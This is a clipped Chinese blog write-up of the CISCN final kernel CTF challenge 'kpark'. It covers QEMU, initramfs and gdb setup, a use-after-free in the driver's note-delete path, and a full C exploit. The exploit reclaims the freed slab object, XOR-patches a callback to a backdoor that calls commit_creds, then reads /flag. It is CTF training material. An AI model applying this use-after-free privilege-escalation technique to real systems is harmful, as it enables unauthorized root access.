---
title: 【先知】ciscn决赛内核
source: https://xz.aliyun.com/news/92889
source_host: xz.aliyun.com
clip_date: 2026-09-29T16:30:24+08:00
trace_id: 1e0c4343-83dc-4823-bfc5-beed4156ae96
content_hash: 5e5f6ee53f8587318235d470ef53ae9b785331004b1aeca3d0f22ab6e3151dcb
status: synced
tags:
  - 先知
  - 内核
  - CTF
series: null
feed_source: 先知安全技术社区
ai_summary: ciscn 决赛内核题 kpark 的复现：借 note 释放后指针未清空的 UAF 重占同尺寸 action 对象，篡改 encoded_cb 指向后门函数 kpark_prize 完成提权，并顺带记录内核题环境搭建、调试与打包方法。
ai_summary_style: key-points:weak
images_status:
  total: 12
  succeeded: 11
  failed_urls:
    - https://xz.aliyun.com/api/v2/files/d7c13399-db40-35d5-990c-c5b66b907114
notion_page_id: 3ea75244-d011-8191-b0d9-e267a9f3562c
ioc: null
---

> 💡 **AI 总结（key-points:weak）**
>
> ciscn 决赛内核题 kpark 的复现：借 note 释放后指针未清空的 UAF 重占同尺寸 action 对象，篡改 encoded_cb 指向后门函数 kpark_prize 完成提权，并顺带记录内核题环境搭建、调试与打包方法。
> 
> - **漏洞点：** delete(note) 走 `kmem_cache_free` 后未把 `notes[idx]` 置空，留下 UAF；note 与 action 同为 64 字节、同一 kmem_cache，释放后立即可被 action 重占。
> - **利用链：** action 的 `encoded_cb = safe_cb ^ (global_cookie ^ object_cookie)`，因 cookie 难泄露，改为对读回的 encoded_cb 异或 `OFF_KPARK_PRIZE ^ OFF_SAFE_CB`（0x520 ^ 0x60 = 0x540，必须用异或不是减法），再用 write 写回，call 后即执行后门提权。
> - **入口与结构：** 所有功能经 ioctl 的 cmd 分支分发（add/del/read/write note、add/del/call/print action 等），第三参为指向 `{idx, padding, size, addr}` 24 字节请求结构的指针，由内核自行解引用。
> - **环境细节：** bzImage 经 QEMU `-kernel` 自解压，rootfs.cpio.gz 作 initramfs 解包执行 `/init`，run.sh 额外用 9P 共享宿主目录到 `/mnt`；解包 `zcat x.cpio.gz | cpio -idmv --no-absolute-filenames`，打包 `find . -print0 | cpio --null -o --format=newc | gzip -9`。
> - **调试方法：** 题目未给 vmlinux，用 vmlinux-to-elf 从 bzImage 提取带符号 ELF；run.sh 加 `-s -S`，gdb 中 `file vmlinux.elf`、`add-symbol-file kpark.ko 0xffffffffc0000000`、`target remote :1234`；IDA 对 .ko 的 DWARF 重定位警告可忽略。
> - **附录网络修复：** DHCP 失败根因是 /etc/netplan 下两份配置争抢 ens33，NetworkManager 未托管而 networkd 未生成 .network；删残留、只留一份并显式写 `renderer: networkd` 后 `netplan apply` 解决。

## ciscn内核复现（一）

很长时间没有做内核了，最近感觉如释重负，赖活着反正是赖活着，倒不如抽空复现一道当时没有做出来的内核

毕竟ai虽然能够在直接感知的层面解决问题，但是却无法修补我内在的思维的缺陷，内在思维的缺陷需要去体验世界万物去慢慢的修复、完善

> ## 本题以8b本地qween模型辅助完成，大模型用于知识点的补充，并不用于题目解决。

## 环境准备

内核题目的环境的构建是比较复杂，对于内核题目给出的各个附件的讲解大致上

内核题环境由四部分组成： **bzImage** 是压缩的内核镜像，由 QEMU `-kernel` 装入并由内核自解压运行； **rootfs.cpio.gz** 是打包好的 initramfs 根文件系统，内核启动时解包进内存当 `/` 并执行其中的 `/init` （不是挂载）； **/init** 负责挂载 proc/sys/devtmpfs/tmpfs、加载 **.ko** 内核模块（ `insmod /kpark.ko` ）、给设备节点放权限、再把 shell 降权到普通用户——漏洞通常在.ko 的驱动实现里，也可能在内核核心代码； **run.sh** 把这些拼成 QEMU 启动命令，并额外用 9P 把宿主机目录共享到 guest 的 `/mnt` ，方便在宿主机编译 exp 后拷进去执行。

## 题目分析

ko文件的代码是用内核级的c代码写的，和用户态的c代码还是有很大。

这里我们遇到了一个警告，这个是可以忽略的，翻译过来如下

> **IDA 解析这个** `.ko` **的 DWARF 调试信息时，**`.rela.debug_info` **里有 3257 条重定位它没全部应用上。**

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1c2d6f9de50518db.png)

这里我们直接分析ioctl这个函数，这里是比较困难的一步

### 第一步：整体逻辑的分析

这里我们使用本地的8b的小模型大体的分析一下逻辑

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d566e37248038bb4.png)

![⚠️ 图片托管失败](https://xz.aliyun.com/api/v2/files/d7c13399-db40-35d5-990c-c5b66b907114)

我们审计代码的能力有限，在审计的过程中，遇到了一个write函数没有找到对应关系的位置

> 这个等待输出的过程是真的折磨

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e93e3e856465cd06.png)

通过这一点可以看出，本地小模型的分析和上下文是极其极其拉胯的

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bf01b855fefa4419.png)

这里我们重新的分析了一遍逻辑，最后找到了write这个功能分支对应的编号，如下

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/44429d92dd69081f.png)

### 第二步：局部逻辑的分析

这里我们可以明显的看到，note这个结构体类型释放的时候没有清空指针，是一个uaf

```c
    if ( cmd == 0x4018B702 )                    // delete(note)
    {
      v4 = -2;
      if ( notes[req.idx] )
      {
        v4 = 0;
        kmem_cache_free(kpark_cache);
      }
      goto LABEL_8;
    }
LABEL_48:
    v4 = -25;
    goto LABEL_8;
  }
```

这里是申请的命令，大小是不受控制的

```c
    if ( cmd == 0x4018B701 )                    // create(note)
    {
      idx = req.idx;
      v4 = -16;
      if ( notes[req.idx] )
        goto LABEL_8;
      notes[idx] = (kpark_note *)kmem_cache_alloc(kpark_cache, 4197568);
      v17 = notes[req.idx];
      if ( v17 )
      {
        *(_QWORD *)v17->data = 0;
        v4 = 0;
        *(_QWORD *)&v17->data[56] = 0;
        memset(
          (void *)((unsigned __int64)&v17->data[8] & 0xFFFFFFFFFFFFFFF8LL),
          0,
          8LL * (((unsigned int)v17 - (((_DWORD)v17 + 8) & 0xFFFFFFF8) + 64) >> 3));
        goto LABEL_8;
      }
```

这个题目是又两个结构体，我们需要考虑一下这个结构体的嵌套的问题

但是上卖弄这个代码可以看出来，这两个是使用两个不同的全局变量进行的存储，为了消除可能性，我们需要分析一下action对应的代码

这里我们可以看到，action的申请存储是建立自己特有的链接之上的

```c
  if ( !actions[req.idx] )
  {
    actions[idx_1] = (kpark_action *)kmem_cache_alloc(kpark_cache, 0x400CC0);
    v18 = actions[req.idx];
    if ( v18 )
    {
      v18->magic = 0;
      *(_QWORD *)&v18->name[24] = 0;
      memset(
        (void *)((unsigned __int64)&v18->encoded_cb & 0xFFFFFFFFFFFFFFF8LL),
        0,
        8LL * (((unsigned int)v18 - (((_DWORD)v18 + 8) & 0xFFFFFFF8) + 64) >> 3));
      actions[req.idx]->magic = 0x4B5041524B323032LL;
      v19 = actions[req.idx];
      v19->object_cookie = get_random_u64();
      v20 = actions[req.idx];
      object_cookie = v20->object_cookie;
      if ( !object_cookie )
      {
        object_cookie = 0x13572468ABCDEF00LL;
        v20->object_cookie = 0x13572468ABCDEF00LL;
      }
      v22 = global_cookie ^ object_cookie;
      v4 = 0;
      v20->printer = action_print;
      v20->encoded_cb = (unsigned __int64)safe_cb ^ v22;
      strscpy(v20->name, "ordinary ticket", 32);
      goto LABEL_8;
    }
    goto LABEL_46;
  }
```

考虑到global_cookie这个值比较难泄露，我们使用全局写死的常量的去解决这个题目

即利用下面这个代码去执行我们想要的函数

```c
    if ( cmd != 0xC018B703 )
    {
      if ( cmd == 0xC018B708 )                  // system
      {
        v4 = -2;
        v6 = actions[req.idx];
        if ( v6 )
        {
          if ( v6->magic == 0x4B5041524B323032LL )
          {
            printer = v6->printer;
            if ( printer )
            {
              v4 = 0;
              printer(v6, (char *)req.addr, req.size);
            }
          }
        }
        goto LABEL_8;
      }
```

题目给了后门函数，我们直接执行后门函数利用即可

```c
void __cdecl kpark_prize()
{
  __int64 v0; // rdi

  v0 = prepare_kernel_cred(&init_task);
  if ( v0 )
    commit_creds(v0);
}
```

## 环境搭建

内核难的点还有一个很重要的点是内核环境的搭建

> 突然看到满屏的曾经做过的题目，有点感慨，再记录一下吧

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/dd3c222ee3b93723.png)

这里我们建立一个共享文件夹，要不文件线下传递很困难

这里我们虚拟机太长时间没用了，镜像都坏了

> 这里不是镜像坏了，是我们的配置文件有问题，修复的过程写在附录里面

```bash
[oh-my-zsh] Would you like to update? [Y/n] y
Updating Oh My Zsh
fatal: unable to access 'https://mirrors.tuna.tsinghua.edu.cn/git/ohmyzsh.git/': Could not resolve host: mirrors.tuna.tsinghua.edu.cn
There was an error updating. Try again later?
```

这里我们把windows目录的附件挂载上去

```bash
 ⚡ root@ziran-VMware-Virtual-Platform  /home/ziran/Desktop  sudo mkdir -p /mnt/hgfs
sudo vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other -o uid=$(id -u) -o gid=$(id -g)
ls /mnt/hgfs/kpark
bzImage      kpark.ko      kpark.ko.id2  Makefile   rootfs.cpio.gz  wp.assets
_dwarf.py    kpark.ko.id0  kpark.ko.nam  README.md  run.sh          wp.md
_elfinfo.py  kpark.ko.id1  kpark.ko.til  _reloc.py  _sym.py
```

之后我们需要写一个gdb自动脚本，改一下start.sh脚本，写一个打包和解包脚本，以及exp.c

这里我们使用的工具都在vscode里面实现

> 后面这些基础我们需要找一下之前保存的脚本

这个root状态的vscode的命令如下

> 不建议这样，太多问题了

```bash
code . --no-sandbox --user-data-dir=/root/.vscode-root
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/dbb72ac909929dd6.png)

### 打包和解包的命令

这一篇文章是我最早写的一篇文章，这里是讲解了cpio文件的打包和解包的操作

[基于栈溢出的内核ROP利用分析与实践-先知社区](https://xz.aliyun.com/news/90818)

> 下面这个是没有共享目录的情况下

这里我们先来建立一个空目录

```bash
mkdir -p rootfs && cd rootfs
```

之后使用这个命令解压gz后缀的包

```bash
zcat ../rootfs.cpio.gz | cpio -idmv --no-absolute-filenames
```

最后打包即可

```bash
find . -print0 | cpio --null -o --format=newc | gzip -9 > ../rootfs.cpio.gz
```

> 共享目录，转移到~这个目录上操作就行了

解包如下

```bash
rm -rf ~/work/kpark
mkdir -p ~/work/kpark && cd ~/work/kpark

# 真实路径（你当前就在 /mnt/hgfs/kpark）
cp /mnt/hgfs/kpark/rootfs.cpio.gz .

# 新建空目录再解，别在已经解过一半的目录里重复解
mkdir rootfs && cd rootfs
zcat ../rootfs.cpio.gz | cpio -idmv --no-absolute-filenames

# 验证软链接（关键）
ls -l bin/ls
```

打包如下

```bash
cd ~/work/kpark/rootfs
# 例如：把编译好的 exp 放进去、或者改 flag
cp /mnt/hgfs/kpark/exp ./exp
chmod 755 ./exp

# 打包（注意输出到父目录，且带 gzip）
find . -print0 | cpio --null -o --format=newc | gzip -9 > ../rootfs-new.cpio.gz
cd ..

# 验证
zcat rootfs-new.cpio.gz | head -c 6        # 必须 070701
zcat rootfs-new.cpio.gz | cpio -t | grep -E '^(exp|init|kpark.ko|flag)$'
ls -lh rootfs-new.cpio.gz
```

> 或者的话提前转移一下目录也是可以的，命令如下

```bash
cd ~/work && rm -rf kpark && mkdir kpark && cd kpark
cp /mnt/hgfs/kpark/{bzImage,kpark.ko,rootfs.cpio.gz,run.sh,Makefile,README.md} .
ls -lh
```

这个题目是有Makefile这个文件，这个是可以用来辅助编译的，我们也可以手动的编译

```bash
musl-gcc -O2 -static -Wall -Wextra -o exp exp.c
```

之后我们运行一下看一下效果，这里我们是完成了基本的框架

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4c127c4a1ecf9170.png)

### 调试

没有调试的话，盲打是最折磨的。

这里我们首选需要改一下run.sh文件，变成下面这个样子就行了

```bash
#!/usr/bin/env bash
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
exec qemu-system-x86_64   -m 256M   -kernel "$DIR/bzImage"   -initrd "$DIR/rootfs.cpio.gz"   -append "console=ttyS0 oops=panic panic=1 nokaslr quiet"   -cpu qemu64,+smep,+smap   -no-reboot -nographic -monitor none   -virtfs local,path="$DIR",mount_tag=host0,security_model=none,readonly=on
-s
-S
```

之后我们需要创建一个gdb.sh文件

```bash
#!/bin/sh
exec gdb -q \
    -ex "set pagination off" \
    -ex "file vmlinux.elf" \
    -ex "add-symbol-file kpark.ko 0xffffffffc0000000" \
    -ex "target remote localhost:1234"
```

这里为了方便开启终端，我们打开root权限的文件管理器

```bash
sudo nautilus /root
```

这里使用分页器进行查看，这样的话是更加清晰的

```bash
less -S run.sh   
```

##### 题目没有给出vmlinux，这里我们需要自己解压

```bash
# ① 一键全套（推荐）
kimg2vmlinux.sh <bzImage> [输出目录]
#    → vmlinux.elf（带符号）+ System.map + vmlinux

# ② 只要带符号的 ELF
vmlinux-to-elf bzImage vmlinux.elf

# ③ 只要符号表文本
kallsyms-finder bzImage > System.map

# ④ 只要原始无符号 vmlinux（官方脚本）
extract-vmlinux bzImage > vmlinux_raw
```

另外，这里我们可以加载符号

```bash
file vmlinux.elf
add-symbol-file kpark.ko 0xffffffffc0000000
```

也可以把这几行命令加进gdb里面

```bash
#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
PORT="${GDBPORT:-1234}"

exec gdb -q \
    -ex "set pagination off" \
    -ex "set confirm off" \
    -ex "file vmlinux.elf" \
    -ex "add-symbol-file kpark.ko 0xffffffffc0000000" \
    -ex "target remote 127.0.0.1:$PORT"
```

还有就是端口可能占用，清除的脚本如下

```bash
lsof -i :1234
```

这里我们就可以正常的开始调试了

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/cd88ea7d3423be6d.png)

这里我们还需要通过调试去确认一下全局变量的地址，静态分析和动态的是有不同的

> 这个是note的分配

```plain
   0xffffffffc000039d <kpark_ioctl+685>    cmp    qword ptr [rbx*8 - 0x3fffdaa0], 0     0 - 0
   0xffffffffc00003a6 <kpark_ioctl+694>    jne    0xffffffffc0000171          <kpark_ioctl+129>
 
   0xffffffffc00003ac <kpark_ioctl+700>    mov    rdi, qword ptr [rip + 0x223d]         RDI, [0xffffffffc00025f0] => 0xffff888003540600 ◂— 0x26be0
   0xffffffffc00003b3 <kpark_ioctl+707>    mov    esi, 0x400cc0                         ESI => 0x400cc0 ◂— 0
   0xffffffffc00003b8 <kpark_ioctl+712>    call   0xffffffff8117bb30          <kmem_cache_alloc>
 
 ► 0xffffffffc00003bd <kpark_ioctl+717>    mov    qword ptr [rbx*8 - 0x3fffdaa0], rax     [0xffffffffc0002560] <= 0xffff8880036461c0 ◂— 0
   0xffffffffc00003c5 <kpark_ioctl+725>    mov    eax, dword ptr [rsp]
   0xffffffffc00003c8 <kpark_ioctl+728>    mov    rax, qword ptr [rax*8 - 0x3fffdaa0]
   0xffffffffc00003d0 <kpark_ioctl+736>    test   rax, rax
   0xffffffffc00003d3 <kpark_ioctl+739>    je     0xffffffffc00004ea          <kpark_ioctl+1018>
 
   0xffffffffc00003d9 <kpark_ioctl+745>    lea    rdi, [rax + 8]
```

> 这个是action分配的过程

```plain
   0xffffffffc0000413 <kpark_ioctl+803>    call   0xffffffff8117bb30          <kmem_cache_alloc>
 
 ► 0xffffffffc0000418 <kpark_ioctl+808>    mov    qword ptr [rbx*8 - 0x3fffdb20], rax     [0xffffffffc00024e8] <= 0xffff88800364a640 ◂— 0
   0xffffffffc0000420 <kpark_ioctl+816>    mov    eax, dword ptr [rsp]
   0xffffffffc0000423 <kpark_ioctl+819>    mov    rax, qword ptr [rax*8 - 0x3fffdb20]
   0xffffffffc000042b <kpark_ioctl+827>    test   rax, rax
   0xffffffffc000042e <kpark_ioctl+830>    je     0xffffffffc00004ea          <kpark_ioctl+1018>
 
   0xffffffffc0000434 <kpark_ioctl+836>    lea    rdi, [rax + 8]
   0xffffffffc0000438 <kpark_ioctl+840>    mov    qword ptr [rax], 0
   0xffffffffc000043f <kpark_ioctl+847>    and    rdi, 0xfffffffffffffff8
   0xffffffffc0000443 <kpark_ioctl+851>    mov    qword ptr [rax + 0x38], 0
   0xffffffffc000044b <kpark_ioctl+859>    sub    rax, rdi
```

这里是可以很清楚的看出来是进行了重用了，并且初始化之后是残留了内核地址的，直接泄露出来就行

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f5f1672b29a25847.png)

### 利用

这里我们建立好调试就能进行利用了，我们需要还原结构体，这里我们需要从ioctl开始理解

> 下面是这个是官方的参考

```c
// glibc / musl 提供的声明，本质是变参
int ioctl(int fd, unsigned long request, ...);
```

> 调用时候时候需要这样构造

```c
ioctl(fd, cmd, arg);
//    ①    ②    ③
```

这里需要注意的是arg是8字节的，这里并不是开头的18字节，而是传入的8字节地址指针，这个会自动的解引用

还原如下

```c
struct kpark_req
{
    uint32_t idx;        /* +0x00  用第几个对象，取值 0~15 */
    uint32_t padding;    /* +0x04  占位，固定填 0          */
    uint64_t size;       /* +0x08  数据长度                */
    uint64_t addr;       /* +0x10  用户态缓冲区地址        */
};
```

最终效果如下

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/50d2345aad882420.png)

#### exp如下

```c
#include <stdio.h>       /* printf             */
#include <stdlib.h>      /* exit               */
#include <string.h>      /* memset, memcpy     */
#include <fcntl.h>       /* open, O_RDWR       */
#include <unistd.h>      /* close, getuid      */
#include <sys/ioctl.h>   /* ioctl              */
#include <stdint.h>      /* uint32_t, uint64_t */

#define DEV_PATH "/dev/kpark"

#define CMD_ADD_NOTE    0x4018b701   /* 建 note：分配 + 清零，不写 magic    */
#define CMD_DEL_NOTE    0x4018b702   /* 删 note：释放后不清空指针（UAF 在这）*/
#define CMD_READ_NOTE   0xc018b703   /* 读 note：把对象内容拷到用户态        */
#define CMD_WRITE_NOTE  0x4018b704   /* 写 note：把用户数据拷进对象          */
#define CMD_ADD_ACTION  0x4018b705   /* 建 action：驱动填 magic/cookie 等    */
#define CMD_DEL_ACTION  0x4018b706   /* 删 action：释放并清空指针            */
#define CMD_CALL        0x4018b707   /* 调用 action 里的回调函数             */
#define CMD_PRINT       0xc018b708   /* 打印 action 的 name 字段             */

/* action 对象的魔数，驱动用它判断对象是否合法 */
#define MAGIC 0x4b5041524b323032

/* 两个函数在模块 .text 里的偏移。注意要用【异或】算差：
   0x520 ^ 0x60 = 0x540，不能用减法（0x520 - 0x60 = 0x4C0，是错的）*/
#define OFF_SAFE_CB      0x60        /* safe_cb      —— 只打印一行日志 */
#define OFF_KPARK_PRIZE  0x520       /* kpark_prize  —— 提权函数       */

/*
 * ioctl 的参数结构体（24 字节）
 * 每次调用 ioctl 都要传一个这个结构体的地址进去
 */
struct kpark_req
{
    uint32_t idx;        /* +0x00  用第几个对象，取值 0~15 */
    uint32_t padding;    /* +0x04  占位，固定填 0          */
    uint64_t size;       /* +0x08  数据长度                */
    uint64_t addr;       /* +0x10  用户态缓冲区地址        */
};

/*
 * action 对象（64 字节）
 * 由驱动在内核里分配，用户态拿不到指针，只能通过 idx 操作
 * 定义它的目的是：把泄漏出来的 64 字节按这个布局解析
 */
struct kpark_action
{
    uint64_t magic;          /* +0x00  魔数，必须等于 MAGIC          */
    uint64_t encoded_cb;     /* +0x08  加密后的回调函数地址          */
    uint64_t object_cookie;  /* +0x10  每个对象一个随机数            */
    void    *printer;        /* +0x18  打印函数地址（默认 action_print）*/
    char     name [32];       /* +0x20  名字，默认 "ordinary ticket"  */
};

/*
 * note 对象（64 字节）
 * 就是一个纯数据块，和 action 大小相同、来自同一个内存池
 */
struct kpark_note
{
    char data[64];           /* +0x00  64 字节随便写 */
};



int dev_fd = -1;             /* 打开设备后拿到的文件描述符 */


int kp_open(void)
{
    dev_fd = open(DEV_PATH, O_RDWR);
    if (dev_fd < 0)
    {
        printf("[-] 打开 %s 失败\n", DEV_PATH);
        return -1;
    }
    printf("[+] 打开 %s 成功，fd = %d\n", DEV_PATH, dev_fd);
    return dev_fd;
}


long kp_ioctl(unsigned long cmd, uint32_t idx, uint64_t size, void *addr)//这里传参是传的地址
{
    struct kpark_req req;
    req.idx     = idx;
    req.padding = 0;
    req.size    = size;
    req.addr    = (uint64_t)addr;   /* 把指针转成整数存进去 */

    return ioctl(dev_fd, cmd, &req);
}


int add_note(uint32_t idx)
{
    return kp_ioctl(CMD_ADD_NOTE, idx, 0, NULL);
}

int del_note(uint32_t idx)
{
    return kp_ioctl(CMD_DEL_NOTE, idx, 0, NULL);
}

int read_note(uint32_t idx, void *out, uint64_t len)
{
    return kp_ioctl(CMD_READ_NOTE, idx, len, out);
}

int write_note(uint32_t idx, void *data, uint64_t len)
{
    return kp_ioctl(CMD_WRITE_NOTE, idx, len, data);
}

int add_action(uint32_t idx)
{
    return kp_ioctl(CMD_ADD_ACTION, idx, 0, NULL);
}

int del_action(uint32_t idx)
{
    return kp_ioctl(CMD_DEL_ACTION, idx, 0, NULL);
}

int call_action(uint32_t idx)
{
    return kp_ioctl(CMD_CALL, idx, 0, NULL);
}

int print_action(uint32_t idx, void *out, uint64_t len)
{
    return kp_ioctl(CMD_PRINT, idx, len, out);
}

int main(void)
{
    if (kp_open() < 0)
    {
        return 1;
    }

    printf("[1] add_note(0) = %d\n", add_note(0));

    printf("[2] del_note(0) = %d\n", del_note(0)); 

    printf("[3] add_action(1) = %d\n", add_action(1));

    struct kpark_action obj;
    memset(&obj, 0, sizeof(obj));
    printf("[4] read_note(0) = %d\n", read_note(0, &obj, sizeof(obj)));
    printf("    magic         = 0x%lx\n", obj.magic);
    printf("    encoded_cb    = 0x%lx\n", obj.encoded_cb);
    printf("    object_cookie = 0x%lx\n", obj.object_cookie);
    printf("    printer       = 0x%lx\n", (unsigned long)obj.printer);
    printf("    name          = %s\n", obj.name); 

    obj.encoded_cb = obj.encoded_cb ^ (OFF_KPARK_PRIZE ^ OFF_SAFE_CB);
    printf("[5] write_note(0) = %d\n", write_note(0, &obj, sizeof(obj))); 

    printf("[6] call_action(1) = %d\n", call_action(1)); 

    printf("[7] uid = %d\n", getuid());
    if (getuid() == 0) { system("cat /flag"); } 

    close(dev_fd);
    return 0;
}
```

## 附录

### 网络修复

一句话： **问题从来不在链路，而在 Ubuntu 里两份 netplan 文件抢同一块网卡，导致 NetworkManager 和 systemd-networkd 谁都没接管** `ens33` **。** 修法是删掉冲突残留、只留一份声明了 `renderer` 的配置。

## 修复过程分四步

**① 证明链路没问题（排除宿主机因素）**

复制

```plain
ip -br link show ens33     → UP + LOWER_UP
ethtool ens33              → Link detected: yes, 1000Mb/s
```

加上 Windows 侧：

复制

```plain
Get-NetAdapter -like "VMware*"  → VMnet8 Up
Get-NetRoute VMnet8             → 192.168.128.0/24 → On-link 存在
Get-Service VMnetDHCP, "VMware NAT Service" → 都 Running
```

结论：虚拟交换机、NAT、DHCP 服务、直连路由全都是好的，锅在 guest 自己。

**② 找出真正的病根：netplan 配置冲突**

`ls -l /etc/netplan/` 里有两份配置同时对 `ens33` 生效：

```plain
50-cloud-init.yaml.bak                              ← 曾声明 ens33 dhcp4（无 renderer，默认 networkd）
90-NM-e25b069f-....yaml                             ← 声明 renderer: NetworkManager 接管 ens33
```

netplan 里同一网卡被两个 renderer 声明是冲突的，实际结果是：

-   NetworkManager 把 `ens33` 标成 **未托管** （ `nmcli device status` ）
-   严格不托管（ `unmanaged-state=2` ）导致 `nmcli connection up` 报 *"No suitable device found"*
-   而 networkd 那份又没被生成到 `/run/systemd/network/` ，所以 `systemctl restart systemd-networkd` 毫无效果

**③ 用静态地址先做端到端验证（定位与修复分离）**

```bash
sudo ip addr flush dev ens33
sudo ip addr add 192.168.128.10/24 dev ens33
sudo ip route add default via 192.168.128.2
```

结果 `ping 192.168.128.1 / .2 / 223.5.5.5` 全通 → **证明只差"谁来持久化配置"这一步**，剩下的纯粹是配置文件的事。

**④ 清残留 + 一份干净配置**

bash

复制

```plain
sudo rm -f /etc/netplan/50-cloud-init.yaml.bak
sudo rm -f /etc/netplan/90-NM-e25b069f-....yaml
sudo tee /etc/netplan/01-ens33.yaml <<'EOF'
network:
  version: 2
  renderer: networkd          # ← 明确指定由谁管，这是关键
  ethernets:
    ens33:
      dhcp4: false
      addresses: [192.168.128.10/24]
      routes: [{to: default, via: 192.168.128.2}]
      nameservers: {addresses: [192.168.128.3, 223.5.5.5]}
EOF
sudo netplan apply
```

清掉 `90-NM-*.yaml` 之后，NetworkManager 不再被指派去管 ens33，"未托管"的报错也随之消失； `renderer: networkd` 则让 systemd-networkd 名正言顺地接管， `netplan apply` 会在 `/run/systemd/network/` 生成 `10-ens33.network` ，地址和路由就自动配上了。

## 三条可复用的经验

1.  **DHCP 拿不到地址 ≠ DHCP 坏了**。先用 `ip -br link` （看 `LOWER_UP` ）、 `ethtool` （看 `Link detected` ）、 `ip neigh` （看 ARP）验证二层，再谈三层——能省掉一大圈瞎试。
2.  `systemctl restart systemd-networkd` **没有输出、没有效果**，通常是 netplan 没生成 `.network` 文件，而不是服务的问题。改完 yaml **必须** `netplan apply` 。
3.  **netplan 的** `renderer` **一个网卡只能有一个**。看到 `nmcli device status` 里 device 是"未托管"，第一反应就该去 `ls /etc/netplan/` 查配置冲突，而不是反复 `systemctl restart NetworkManager` 。

顺带一提：中间我让你手工配的 `192.168.8.10` 是 **我猜错了网段** （真实是 `192.168.128.0/24` ），那次 `Destination Host Unreachable` 就是 ARP 不到不存在的网关，属于白走的一步——教训是配静态地址前先把宿主机 `ipconfig` 的真实网段拿到手。
